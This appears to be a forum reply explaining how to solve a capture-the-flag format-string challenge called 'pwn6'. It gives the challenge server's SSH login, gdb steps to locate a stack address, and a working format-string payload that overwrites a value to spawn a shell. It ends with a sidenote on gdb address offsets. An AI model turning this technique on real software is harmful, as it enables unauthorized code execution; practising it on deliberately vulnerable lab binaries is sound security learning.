Get onto the server, using SSH or, of course SSHRC:
 
ssh pwn6@binary.challenges.pwnerrank.com pass: pwn6
 
open pwnme in gdb:   gdb pwnme
Set breakpoint where esp+0x9c : is (or anywhere in main):
b*0x0804857c
Get addr of esp+0x9c:  x/xw $esp+0x9c
 
So that gives us the address we need to modify to hold 1337 is: 0xffffd6dc
 
I re-went into the server 3-4 times and everytime I got 0xffffd6dc as my target address, so i think thats your problem cuz you were using a slightly different one...
 
So now just our one-liner really:
 
r $(python -c 'print "\xdc\xd6\xff\xff"')-%1331u-%5\$n
 
Another thing you didn't have quite right was that you didn't have the 'print' command in your one-liner so you need that too...
 
So just keep doing the x/xw $esp+0x9c until it shows 0x00000539 and thats the value that gets you the shell. Just keep changing the 1331 until its proper. Now just run that in the bash shell and change \xdc until it hits the right spot...
 
 
r $(python -c 'print "\xdc\xd6\xff\xff"')-%1331u-%5\$n
 
Changing it to \xfc is what ended up working so it was actually 0x20 higher
 
 
Sidenote:
 
I tried compiling a small script like:
 
int main(void){
int n;
printf("Address of int n is %p", &n);
return 0;
}
 
and I compared the values of %p inside gdb when ran and ran in shell and it was only 0x10 difference. Just thought that was interesting.
